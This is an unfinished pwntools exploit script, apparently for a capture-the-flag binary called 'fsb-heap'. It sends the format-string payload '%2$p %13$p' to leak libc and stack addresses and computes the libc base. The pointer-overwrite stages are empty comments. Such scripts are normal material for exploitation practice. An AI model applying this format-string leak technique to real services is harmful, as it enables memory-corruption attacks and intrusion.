from pwn import *

def word_sub(a1,a2):
	if a1==a2:
		return 2**16
	else:
		return (a1-a2)%2**16

if __name__ == "__main__":
	e = ELF("./libc_32.so")

	p = process("./fsb-heap")
	gdb.attach(p,gdbscript="b *0x0804858E")
	# libc leak and stack leak
	p.sendline("%2$p %13$p")
	d1,d2 = p.recvline().split(" ")
	LIBC = int(d1,16) - e.symbols['_IO_2_1_stdin_']
	STACK = int(d2,16)
	log.info("LIBC: 0x%x"%LIBC)
	log.info("STACK: 0x%x"%STACK)

	# stack pointer overwrite 1 (13, 14, 15)

	# stack pointer overwrite 2


	p.interactive()
